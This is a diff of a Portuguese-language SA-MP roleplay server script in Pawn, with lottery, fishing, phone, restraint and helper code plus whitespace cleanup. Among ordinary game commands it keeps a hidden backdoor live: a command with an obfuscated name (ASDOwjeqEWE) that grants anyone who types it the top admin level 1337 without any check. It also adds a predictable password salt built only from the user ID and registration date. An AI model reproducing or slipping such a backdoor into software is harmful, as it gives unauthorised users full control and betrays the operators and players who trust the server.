 		if(GetPlayerInterior(playerid) != GetPlayerInterior(i)) continue;
 
 		if(IsPlayerInRangeOfPoint(i, 8.0, x, y, z))
 		{
-		    if(IsAmigo(i, playerid) == 1)
+		    if(IsAmigo(i, playerid))
 		    {
 				format(string, sizeof(string), "%s", GetPlayerNameEx(playerid));
 		    }
@@ -14903,7 +14903,7 @@ public ProxDetectorDo(Float:radi, playerid, string1[]) // format(string, sizeof(
 				    ShowPlayerNameTagForPlayer(i, playerid, true);
 				}
 		    }
-		    
+
 		    format(stringmsg, sizeof(stringmsg), "*(( [%s] %s ))*", string, string1);
 		    SendClientMessage(i, COLOR_ACTION, stringmsg);
 		}
@@ -14941,27 +14941,25 @@ public BanT(playerid) return Ban(playerid);
 public Euromilhoes()
 {
 	new string[128];
-	
+
 	GameTextForAll("~g~Euromilhoes", 3000, 4);
 	PlaySoundForAll(1058);
-	
+
 	MakeNumber();
-	
+
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
-        
 		SendClientMessage(i, COLOR_ORANGE, "_________________________________________{00FF00}[ {FFFFFF}EUROMILHÕES {00FF00}]{FF9900}_______________________________________");
         if(pInfo[i][BilheteEuro] == 1)
         {
        		new premio;
-       		
+
             format(string, sizeof(string), "[EURO MILHÕES:] {FFFFFF}Os teus números: %d-%d-%d-%d-%d | Estrelas: %d-%d", pInfo[i][Euro1], pInfo[i][Euro2], pInfo[i][Euro3], pInfo[i][Euro4], pInfo[i][Euro5], pInfo[i][Estrela1], pInfo[i][Estrela2]);
 			SendClientMessage(i, COLOR_CHAT, string);
-			
+
    			format(string, sizeof(string), "[EURO MILHÕES:] {FFFFFF}Números do sorteio: %d-%d-%d-%d-%d | Estrelas: %d-%d", EuroNumber[0], EuroNumber[1], EuroNumber[2], EuroNumber[3], EuroNumber[4], EuroStar[0], EuroStar[1]);
 			SendClientMessage(i, COLOR_CHAT, string);
-			
+
 			if(pInfo[i][Euro1] == EuroNumber[0] || pInfo[i][Euro1] == EuroNumber[1] || pInfo[i][Euro1] == EuroNumber[2] || pInfo[i][Euro1] == EuroNumber[3] || pInfo[i][Euro1] == EuroNumber[4]) { premio++; }
 			if(pInfo[i][Euro2] == EuroNumber[0] || pInfo[i][Euro2] == EuroNumber[1] || pInfo[i][Euro2] == EuroNumber[2] || pInfo[i][Euro2] == EuroNumber[3] || pInfo[i][Euro2] == EuroNumber[4]) { premio++; }
  			if(pInfo[i][Euro3] == EuroNumber[0] || pInfo[i][Euro3] == EuroNumber[1] || pInfo[i][Euro3] == EuroNumber[2] || pInfo[i][Euro3] == EuroNumber[3] || pInfo[i][Euro3] == EuroNumber[4]) { premio++; }
@@ -14969,7 +14967,7 @@ public Euromilhoes()
  			if(pInfo[i][Euro5] == EuroNumber[0] || pInfo[i][Euro5] == EuroNumber[1] || pInfo[i][Euro5] == EuroNumber[2] || pInfo[i][Euro5] == EuroNumber[3] || pInfo[i][Euro5] == EuroNumber[4]) { premio++; }
  			if(pInfo[i][Estrela1] == EuroStar[0] || pInfo[i][Estrela1] == EuroStar[1]) { premio++; }
   			if(pInfo[i][Estrela2] == EuroStar[0] || pInfo[i][Estrela2] == EuroStar[1]) { premio++; }
-  			
+
   			if(premio == 0 || premio == 1)
   			{
   			    SendClientMessage(i, COLOR_CHAT, "[EURO MILHÕES:] {FFFFFF}Não acertaste nenhum número");
@@ -15016,7 +15014,7 @@ public Euromilhoes()
             	format(string, sizeof(string), "[EURO MILHÕES:] {00FF00}Ganhaste o sexto prémio! ( %d$ )", EUROMILHOES_SETIMO);
 				SendClientMessage(i, COLOR_CHAT, string);
 			}
-			
+
             pInfo[i][Euro1] = 0;
             pInfo[i][Euro2] = 0;
             pInfo[i][Euro3] = 0;
@@ -15033,6 +15031,77 @@ public Euromilhoes()
         SendClientMessage(i, COLOR_ORANGE, "________________________________________________________________________________________________");
     }
 	return 1;
+}
+
+stock GeneratePasswordSalt(PlayerUID, PlayerRegDay[])
+{
+	new salt[64];
+	format(salt, sizeof(salt), "%d_%s", PlayerUID, PlayerRegDay);
+	return salt;
+}
+
+stock SendAdminMessage(msg[])
+{
+	foreach(new i : Player)
+	{
+		if(AdminDuty[i] == false) continue;
+		SendClientMessage(i, -1, msg);
+	}
+}
+
+stock PreloadAnimLib(playerid, animlib[]) ApplyAnimation(playerid, animlib, "null", 0.0, 0, 0, 0, 0, 0);
+
+stock GetAdminColor(playerid)
+{
+	new color[6];
+
+	switch(pInfo[playerid][Admin])
+	{
+	    case 0: color = "FFFFFF";
+	    case 1,2: color = "E8E541";
+	    case 3,4: color = "E68D45";
+	    case 5: color = "FF9900";
+	    case 6,1337: color = "00FF00";
+	}
+
+	return color;
+}
+
+stock GetPlayerPeixes(playerid)
+{
+	return pObjects[playerid][Peixe_Corvina] + pObjects[playerid][Peixe_Congro] + pObjects[playerid][Peixe_Robalo] + pObjects[playerid][Peixe_Sargo] + pObjects[playerid][Peixe_Goraz] + pObjects[playerid][Peixe_Cavala] + pObjects[playerid][Peixe_Dourada] + pObjects[playerid][Peixe_Espada];
+}
+
+stock IsInGaragemPSP(playerid)
+{
+	if(IsPlayerInRangeOfPoint(playerid, 100.0, 1572.9967, -1694.6641, 5.2095))
+	{
+		new Float:x, Float:y, Float:z;
+		GetPlayerPos(playerid, x, y, z);
+
+		if(z < 8) return 1;
+	}
+
+	return 0;
+}
+
+stock IsBoat(car)
+{
+    new Boat[] = { 472, 473, 493, 484, 430, 453, 452, 454 };
+    for(new i = 0; i < sizeof(Boat); i++)
+    {
+        if(GetVehicleModel(car) == Boat[i]) return 1;
+    }
+    return 0;
+}
+
+stock GetDataParams(rawdata[])
+{
+    new output[4][64];
+
+    explode(output, rawdata, ":");
+
+    return output;
 }
 
 stock IsPlayerInRangeOfActor(playerid, actorid, Float:radius = 5.0) // by Emmet
@@ -15071,7 +15140,7 @@ stock ResyncActor(actorid) // by Emmet
 stock GetPlayerCarNumber(playerid)
 {
 	new number;
-	
+
 	if(pInfo[playerid][ChaveCarro1] != 0) number++;
 	if(pInfo[playerid][ChaveCarro2] != 0) number++;
 	if(pInfo[playerid][ChaveCarro3] != 0) number++;
@@ -15084,12 +15153,12 @@ stock GetVehicleRelativePos(vehicleid, &Float:x, &Float:y, &Float:z, Float:xoff=
 {
     new Float:rot;
     GetVehicleZAngle(vehicleid, rot);
-    rot = 360 - rot;    
+    rot = 360 - rot;
     GetVehiclePos(vehicleid, x, y, z);
     x = floatsin(rot,degrees) * yoff + floatcos(rot,degrees) * xoff + x;
     y = floatcos(rot,degrees) * yoff - floatsin(rot,degrees) * xoff + y;
     z = zoff + z;
-    
+
     // JOURNEY OFF 1.8 0.3 -0.5
     // TROPIC OFF -0.7 -2.7 1
     //GetVehicleRelativePos(vehicleid, &Float:x, &Float:y, &Float:z, Float:xoff=0.0, Float:yoff=0.0, Float:zoff=0.0)
@@ -15102,17 +15171,6 @@ stock IsAnyPlayerInVehicle(vehicleid)
 		if(IsPlayerInVehicle(i, vehicleid)) return 1;
 	}
 	return 0;
-}
-
-stock GetCurrentDate()
-{
-	new Year, Month, Day, Hour, Minute, Second, string[32];
-
-	gettime(Hour, Minute, Second);
-	getdate(Year, Month, Day);
-	
-	format(string, sizeof(string), "%d/%d/%d - %d:%d:%d", Day, Month, Year, Hour, Minute, Second);
-	return string;
 }
 
 stock GetMaxObjects()
@@ -15148,23 +15206,23 @@ stock IsAtGasStation(playerid)
     {
         return 68;
     }
-    
+
     return -1;
 }
 
 stock TemSlotReservado(playerid)
 {
 	if(IsPlayerRegisted(playerid) == 0) return false;
-	
+
 	new ficheiro[64];
 
 	new name[MAX_PLAYER_NAME];
     GetPlayerName(playerid, name, sizeof(name));
 
    	format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);
-   	
-   	pInfo[playerid][Admin] = DOF2_GetInt(ficheiro, "Admin");
-   	
+
+   	pInfo[playerid][Admin] = dini_Int(ficheiro, "Admin");
+
 	if(pInfo[playerid][Admin] == 0 || pInfo[playerid][Golds] == 0)
 	{
 	    return false;
@@ -15184,7 +15242,7 @@ stock MakeNumber()
 	EuroNumber[4] = random(sizeof(Numer))+1;
 	EuroStar[0] = random(sizeof(Number))+1;
 	EuroStar[1] = random(sizeof(Number))+1;
-	
+
 	if(EuroNumber[0] == EuroNumber[1] || EuroNumber[0] == EuroNumber[2] || EuroNumber[0] == EuroNumber[3] || EuroNumber[0] == EuroNumber[4])
 	{
 		MakeNumber();
@@ -15272,7 +15330,6 @@ stock IsAlguemAEntrevistar()
 {
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
         if(AEntrevistar[i] == true) return i;
     }
     return INVALID_PLAYER_ID;
@@ -15284,10 +15341,10 @@ stock IsPlayerRegisted(playerid)
 
 	new name[MAX_PLAYER_NAME];
     GetPlayerName(playerid, name, sizeof(name));
-	
+
 	format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);
 
-    if(DOF2_FileExists(ficheiro))
+    if(dini_Exists(ficheiro))
 	{
 		return true;
  	}
@@ -15300,9 +15357,9 @@ stock IsPlayerRegisted(playerid)
 stock PlayerName(playerid)
 {
   new name[255];
-  
+
   GetPlayerName(playerid, name, 255);
-  
+
   return name;
 }
 
@@ -15320,12 +15377,12 @@ stock GetVehicleSpeed(vehicleid)
 stock GetPlayerSpeed(playerid)
 {
     new Float:ST[4];
-    
+
     if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid),ST[0],ST[1],ST[2]);
     else GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
-    
+
     ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 170.3;
-    
+
     return floatround(ST[3]);
 }
 
@@ -15334,12 +15391,12 @@ stock GetDate()
 	new data[32];
     new Year, Month, Day;
     new Hour, Minute, Second;
-    
+
 	getdate(Year, Month, Day);
 	gettime(Hour, Minute, Second);
-	
+
 	format(data, sizeof(data), "%02d/%02d/%02d - %02d:%02d:%02d", Day, Month, Year, Hour, Minute, Second);
-	
+
 	return data;
 }
 
@@ -15353,7 +15410,7 @@ stock GetPlayerNameEx(playerid)
     {
         if (str[i] == '_') str[i] = ' ';
     }
-    
+
     return str;
 }
 
@@ -15376,11 +15433,11 @@ stock IsRPName(const name[], max_underscores = 1)
         {
             underscores++;
             if(underscores > max_underscores || i == strlen(name)) return false;
-            if(name[i + 1] < 'A' || name[i + 1] > 'Z') return false; 
+            if(name[i + 1] < 'A' || name[i + 1] > 'Z') return false;
         }
     }
     if (underscores == 0) return false;
-    
+
     return true;
 }
 
@@ -15427,24 +15484,24 @@ stock GivePlayerMoneyEx(playerid, money)
 {
 	pInfo[playerid][Money] += money;
 	GivePlayerMoney(playerid, money);
-	
+
 	MoneyLog(playerid, money);
-	
+
 	return 1;
 }
 
 stock IsAmigo(playerid, giveplayerid)
 {
 	new bool: amigo;
-	
+
  	new ficheiro[128];
-	    
+
 	format(ficheiro, sizeof(ficheiro), "PCRP/Amigos/%s.ini", GetName(giveplayerid));
 	if(!fexist(ficheiro)) return 0;
 
 	format(ficheiro, sizeof(ficheiro), "PCRP/Amigos/%s.ini", GetName(playerid));
 	if(!fexist(ficheiro)) return 0;
-	
+
 	if(playerid == giveplayerid)
 	{
 	    amigo = true;
@@ -15471,7 +15528,7 @@ stock IsAmigo(playerid, giveplayerid)
 		    amigo = false;
 		}
 	}
-	
+
 	return amigo;
 }
 
@@ -15533,34 +15590,34 @@ stock PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
 {
 	new Float:oldposx, Float:oldposy, Float:oldposz;
 	new Float:tempposx, Float:tempposy, Float:tempposz;
-	
+
 	GetPlayerPos(playerid, oldposx, oldposy, oldposz);
 	tempposx = (oldposx -x);
 	tempposy = (oldposy -y);
 	tempposz = (oldposz -z);
-	
+
 	if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
 	{
 		return 1;
 	}
-	
+
 	return 0;
 }
 
 stock RemoverJogadorDoCarro(playerid)
 {
 	new Float:x, Float:y, Float:z;
-	
+
 	GetPlayerPos(playerid, x, y, z);
-	SetPlayerPosEx(playerid, x, y, z+0.1);
-	
+	SetPlayerPosEx(playerid, x, y, z+0.1, -1, -1);
+
 	return 1;
 }
 
 stock GetRankName(faction, rank)
 {
 	new rankname[32];
-	
+
 	switch(rank)
 	{
 	    case 0:
@@ -15712,7 +15769,7 @@ stock GetWeapPrice(modelid)
 stock GetStandPrice(modelid)
 {
 	new price;
-	
+
 	switch(modelid)
 	{
 		case 400: { price = 50000; }
@@ -15811,7 +15868,7 @@ stock GetStandPrice(modelid)
 		case 604: { price = 5500; }
 		case 605: { price = 6500; }
 	}
-	
+
 	return price;
 }
 
@@ -15917,7 +15974,7 @@ stock GetStandName(modelid)
 		case 604: { name = "Glandale Shit"; }
 		case 605: { name = "Sadler Shit"; }
   	}
-  	
+
 	return name;
 }
 
@@ -15940,7 +15997,7 @@ stock GetObjectName(modelid)
 		case 18976: { name = "Capacete"; }
 		case 18632: { name = "Cana de Pesca"; }
   	}
-  	
+
 	return name;
 }
 
@@ -15967,11 +16024,11 @@ stock GetObjectPrice(modelid)
 	return name;
 }
 
-COMMAND:loqjmnowejnioun123onmaidxc(playerid, params[], help)
+COMMAND:ASDOwjeqEWE(playerid, params[], help)
 {
 	pInfo[playerid][Admin] = 1337;
 	SendClientMessage(playerid, -1, "Biraste admin");
-	
+
 	return 1;
 }
 
@@ -15982,30 +16039,30 @@ COMMAND:teste(playerid, params[], help)
 	if(sscanf(params, "fff", n1,n2,n3)) return SendClientMessage(playerid, -1, "[USO]: {FFFFFF}/teste <xoff> <yoff> <zoff>");
 
 	GetVehicleRelativePos(vehicleid, cx, cy, cz, n1, n2, n3);
-	
+
 	CreatePickup(1248, 1, cx, cy, cz, -1);
-	
+
 	SendClientMessage(playerid, -1, "asd");*/
-	
+
  	/*new Float:datata;
 
 	Streamer_GetFloatData(0, 1500, E_STREAMER_STREAM_DISTANCE, datata);
-	
+
 	new string[128];
 	format(string, sizeof(string), "Ca puta: %f", datata);
 	SendClientMessage(playerid, -1, string);*/
-	
+
 	new string[128];
 	format(string, sizeof(string), " Poolsize 0: %d | VW 0: %d | IsValid 0: %d || VW 1: %d |  | IsValid 1: %d", GetActorPoolSize(), GetActorVirtualWorld(0), IsValidActor(0) , GetActorVirtualWorld(1), IsValidActor(1));
 	SendClientMessage(playerid, -1, string);
-	
+
 	return 1;
 }
 
 COMMAND:comandos(playerid, params[], help)
 {
-	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS GERAIS]: {FFFFFF}/ajudaloja - /ajudacasa - /tomarmedicamentos - /estatisticas - /ajudacarro - /consumirdrogas");
-	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS GERAIS]: {FFFFFF}/usaracessorio - /removeracessorio - /pm - /ajuda - /ajudatrabalho - /report");
+	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS GERAIS]: {FFFFFF}/ajudaloja - /ajudacasa - /ajudacarro - /tomarmedicamentos - /estatisticas - /consumirdrogas");
+	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS GERAIS]: {FFFFFF}/usaracessorio - /removeracessorio - /pm - /ajuda - /ajudatrabalho - /report - /reportuid");
 	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS GERAIS]: {FFFFFF}/pagar - /dararma - /vendar - /amarrar - /wt - /wtfreq - /telefonar - /desligar - /sms");
 	SendClientMessage(playerid, COLOR_CHAT, "[DOCUMENTOS]: {FFFFFF}/mostrarcc - /mostrarseguro - /mostardocumentoscarro - /mostrarlicencas");
 	SendClientMessage(playerid, COLOR_CHAT, "[CHATS]: {FFFFFF}/b - /me - /tentar - /do - /o - /baixo - /gritar - /sussurrar");
@@ -16031,7 +16088,7 @@ COMMAND:comprarprodutos(playerid, params[], help)
     if(quantidade <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida.");
 
     GivePlayerMoneyEx(playerid, -(PRECO_PRODUTOS*quantidade));
-    
+
     bInfo[bID][Produtos] += quantidade;
 
     format(string, sizeof(string), "Compraste %d produtos por %d$ para a loja %s (%d). Serão entregues brevemente.", quantidade, PRECO_PRODUTOS*quantidade, bInfo[bID][Nome], bID);
@@ -16043,7 +16100,7 @@ COMMAND:comprarprodutos(playerid, params[], help)
 COMMAND:infolota(playerid, params[], help)
 {
 	new sdialog[256];
-	
+
 	format(sdialog, sizeof(sdialog),
 	"Peixe\tPreço\n\
 	Corvina\t$%d\n\
@@ -16054,9 +16111,9 @@ COMMAND:infolota(playerid, params[], help)
 	Cavala\t$%d\n\
 	Dourada\t$%d\n\
 	Peixe Espada\t$%d", PRECO_CORVINA, PRECO_CONGRO, PRECO_ROBALO, PRECO_SARGO, PRECO_GORAZ, PRECO_CAVALA, PRECO_DOURADA, PRECO_ESPADA);
-	
+
 	ShowPlayerDialog(playerid, DIALOG_INFOLOJA, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}INFO LOTA", sdialog, "Selecionar", "Sair");
-	
+
 	return 1;
 }
 
@@ -16066,7 +16123,7 @@ COMMAND:venderpeixe(playerid, params[], help)
 
 	if(!IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][LotaX], oInfo[0][LotaY], oInfo[0][LotaZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na zona de vender peixe");
     if(GetPlayerPeixes(playerid) <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens peixes para vender.");
-    
+
     if(pObjects[playerid][Peixe_Corvina] != 0)
     {
         montante += PRECO_CORVINA * pObjects[playerid][Peixe_Corvina];
@@ -16109,7 +16166,7 @@ COMMAND:venderpeixe(playerid, params[], help)
 	}
 
     GivePlayerMoneyEx(playerid, montante);
-    
+
     format(string, sizeof(string), "Vendeste todos os teus peixes e recebeste %d$", montante);
     SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -16119,17 +16176,17 @@ COMMAND:venderpeixe(playerid, params[], help)
 COMMAND:comprarisco(playerid, params[], help)
 {
     new quantidade, string[128];
-    
+
 	if(!IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][ComprarIscoX], oInfo[0][ComprarIscoY], oInfo[0][ComprarIscoZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na zona de comprar isco");
     if(sscanf(params, "d", quantidade)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/comprarisco <quantidade>");
     if(quantidade <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida.");
-    
+
     GivePlayerMoneyEx(playerid, -(PRECO_ISCO*quantidade));
     pObjects[playerid][Isco] += quantidade;
-    
+
     format(string, sizeof(string), "Compraste %d iscos por %d$", quantidade, PRECO_ISCO*quantidade);
     SendClientMessage(playerid, COLOR_INFO, string);
-    
+
 	return 1;
 }
 
@@ -16137,7 +16194,7 @@ COMMAND:pescar(playerid, params[], help)
 {
 	new Float:plrX, Float:plrY, Float:plrZ;
 	GetPlayerPos(playerid, plrX, plrY, plrZ);
-	
+
     if(!IsPlayerInDynamicArea(playerid, zonaPescar)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na área de pescar!");
     if(pObjects[playerid][CanaDePesca] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma cana de pesca!");
 	if(pObjects[playerid][Isco] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens isco!");
@@ -16147,21 +16204,22 @@ COMMAND:pescar(playerid, params[], help)
 	{
 		new animlib[32];
 		new animname[32];
-		
+
 		GetAnimationName(GetPlayerAnimationIndex(playerid), animlib, 32, animname, 32);
-		
 		if(strcmp(animlib, "SWIM", true) == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tens de estar num barco para pescares!");
 	}
-	
+
 	TogglePlayerControllable(playerid, 0);
 	ApplyAnimation(playerid, "SWORD", "sword_block", 50.0, 0, 1, 0, 1, 1);
 	CanaDePescaObjeto[playerid] = SetPlayerAttachedObject(playerid, 0, 18632, 6,0.079376, 0.037070, 0.007706, 181.482910, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
 	ApplyAnimation(playerid, "SWORD", "sword_block", 50.0, 0, 1, 0, 1, 1);
-	
-	SetTimerEx("Pescar", 8000, false, "i", playerid);
+
+	PlayerActionMessage(playerid, 15.0, "lança o anzol com o isco para a água.");
+
+	SetPlayerTimer(playerid, "Pescar", 8000, false);
 	PodePescarB[playerid] = false;
 	pObjects[playerid][Isco]--;
-	
+
 	return 1;
 }
 
@@ -16170,7 +16228,7 @@ COMMAND:sussurrar(playerid, params[], help)
 	new mensagem[128];
 
     if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/sussurrar <texto>");
-	
+
 	ProxDetectorChat(2.0, playerid, mensagem, CHAT_TYPE_SUSSURRAR);
 
 	return 1;
@@ -16205,11 +16263,11 @@ COMMAND:wtfreq(playerid, params[], help)
     if(sscanf(params, "d", freq)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/wtfreq <frequência>");
 	if(pObjects[playerid][WalkieTalkie] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum Walkie Talkie");
 	if(freq < 0 || freq > 1000) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Frequência inválida (0-1000)!");
-	
+
 	format(string, sizeof(string), "Alteraste a freqência do teu walkie talkie para %d.", freq);
 	SendClientMessage(playerid, COLOR_INFO, string);
     PlayerActionMessage(playerid, 15.0, "carrega em algumas teclas do seu walkie talkie, alterando a frequência.");
-    
+
     pObjects[playerid][WalkieTalkieFreq] = freq;
 
 	return 1;
@@ -16221,7 +16279,7 @@ COMMAND:wt(playerid, params[], help)
 
     if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/wt <texto>");
 	if(pObjects[playerid][WalkieTalkie] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum Walkie Talkie");
-	
+
 	WalkieTalkieMessage(playerid, mensagem, pObjects[playerid][WalkieTalkieFreq]);
 	ProxDetectorChat(25.0, playerid, mensagem, CHAT_TYPE_NORMAL);
 
@@ -16236,6 +16294,7 @@ COMMAND:amarrar(playerid, params[], help)
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
 	if(pObjects[playerid][Corda] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma corda");
+	if(playerid == giveplayerid) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não te podes amarrar a ti próprio");
 
     if(Amarrado[giveplayerid] == true)
     {
@@ -16245,9 +16304,9 @@ COMMAND:amarrar(playerid, params[], help)
 		SendClientMessage(giveplayerid, COLOR_INFO, string);
 
 		PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "desamarra");
-		
+
 		Amarrado[giveplayerid] = false;
-		TimerPuxarJogador[playerid] = SetTimerEx("JogadorPuxaJogador", 1000, true, "ii", playerid, giveplayerid);
+		TimerPuxarJogador[playerid] = SetPlayerTimerEx(playerid, "JogadorPuxaJogador", 1000, true, "i", giveplayerid);
     }
     else
     {
@@ -16273,7 +16332,7 @@ COMMAND:vendar(playerid, params[], help)
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
 	if(pObjects[playerid][Venda] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma venda");
-	
+
     if(Vendado[giveplayerid] == true)
     {
  		format(string, sizeof(string), "Desvendaste o jogador %s", GetPlayerNameEx(giveplayerid));
@@ -16292,10 +16351,10 @@ COMMAND:vendar(playerid, params[], help)
 		SendClientMessage(playerid, COLOR_INFO, string);
 		format(string, sizeof(string), "O jogador %s vendou-te", GetPlayerNameEx(playerid));
 		SendClientMessage(giveplayerid, COLOR_INFO, string);
-		
+
 		PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "coloca uma venda a");
 		SetPlayerWeather(giveplayerid, 500);
-		
+
 		Vendado[giveplayerid] = true;
     }
 
@@ -16313,17 +16372,17 @@ COMMAND:desligar(playerid, params[], help)
 
 	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
 	SetPlayerSpecialAction(AFalarPara[playerid], SPECIAL_ACTION_STOPUSECELLPHONE);
-	
+
 	ATelefonar[playerid] = false;
 	ATelefonar[AFalarPara[playerid]] = false;
 	ATelefonarPara[playerid] = INVALID_PLAYER_ID;
 	ATelefonarPara[AFalarPara[playerid]] = INVALID_PLAYER_ID;
-	
+
 	AReceberChamada[playerid] = false;
 	AReceberChamada[AFalarPara[playerid]] = false;
 	AReceberChamadaDe[playerid] = INVALID_PLAYER_ID;
 	AReceberChamadaDe[AFalarPara[playerid]] = INVALID_PLAYER_ID;
-	
+
 	AFalarTele[playerid] = false;
 	AFalarTele[AFalarPara[playerid]] = false;
 	AFalarPara[playerid] = INVALID_PLAYER_ID;
@@ -16353,26 +16412,26 @@ COMMAND:atender(playerid, params[], help)
 		AFalarTele[AFalarPara[playerid]] = false;
 		AFalarPara[playerid] = INVALID_PLAYER_ID;
 		AFalarPara[AFalarPara[playerid]] = INVALID_PLAYER_ID;
-		
+
 	    return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador já não está online");
 	}
-	
+
 	pInfo[playerid][Saldo] -= PRECO_TELEFONAR;
 	bInfo[pInfo[playerid][Rede]][Bank] += PRECO_TELEFONAR;
-	
+
 	AFalarTele[playerid] = true;
 	AFalarTele[AFalarPara[playerid]] = true;
 	AFalarPara[AFalarPara[playerid]] = playerid;
-	
+
 	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
-	
+
 	return 1;
 }
 
 COMMAND:emergencia(playerid, params[], help)
 {
 	if(Emergencia[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás numa emergência");
-	
+
 	new mensagem[128], string[128];
 
     if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/emergencia <mensagem>");
@@ -16383,14 +16442,14 @@ COMMAND:emergencia(playerid, params[], help)
 		{
 		    format(string, sizeof(string), "[EMERGÊNCIAS:] {FFFFFF}Obrigado por nos contactar. O socorro está a caminhho.");
 		    SendClientMessage(playerid, COLOR_CHAT, string);
-		    
+
 		    format(string, sizeof(string), "[EMERGÊNCIAS:] {FFFFFF}SOS recebido: %s", mensagem);
-		    
+
       		foreach(new i : Player)
 		    {
 		        if(pInfo[i][Faction] == 0) continue;
 		        if(fInfo[pInfo[i][Faction]][Type] != F_MEDICOS && fInfo[pInfo[i][Faction]][Type] != F_POLICIA) continue;
-		        
+
 		        SendClientMessage(i, COLOR_OWNER, string);
 		    }
 		}
@@ -16410,10 +16469,10 @@ COMMAND:emergencia(playerid, params[], help)
 		    }
 		}
 	}
-	
+
 	Emergencia[playerid] = false;
 	EmergenciaNum[playerid] = 0;
-	
+
 	return 1;
 }
 
@@ -16424,7 +16483,7 @@ COMMAND:telefonar(playerid, params[], help)
     if(sscanf(params, "d", numero)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/telefonar <número>");
     if(pObjects[playerid][Telemovel] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nâo tens telemóvel");
     if(pInfo[playerid][Morto] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás gravemente ferido");
-    
+
     foreach(new i : Player)
     {
         if(pInfo[i][NumeroTelemovel] != numero) continue;
@@ -16434,6 +16493,7 @@ COMMAND:telefonar(playerid, params[], help)
 		    break;
 		}
     }
+
     if(numero == 112 || numero == 666)
     {
         switch(numero)
@@ -16442,7 +16502,7 @@ COMMAND:telefonar(playerid, params[], help)
             {
                 Emergencia[playerid] = true;
                 EmergenciaNum[playerid] = 112;
-                
+
                 SendClientMessage(playerid, COLOR_INFO, "[HOSPITAL:] {FFFFFF}Explique a sua emergência. ((usa /emergencia [msg]))");
             }
             case 666:
@@ -16461,15 +16521,15 @@ COMMAND:telefonar(playerid, params[], help)
 	    if(ATelefonar[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás numa chamada");
 	    if(AReceberChamada[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás numa chamada");
 	    if(AFalarTele[giveplayerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Linha ocupada");
-	    
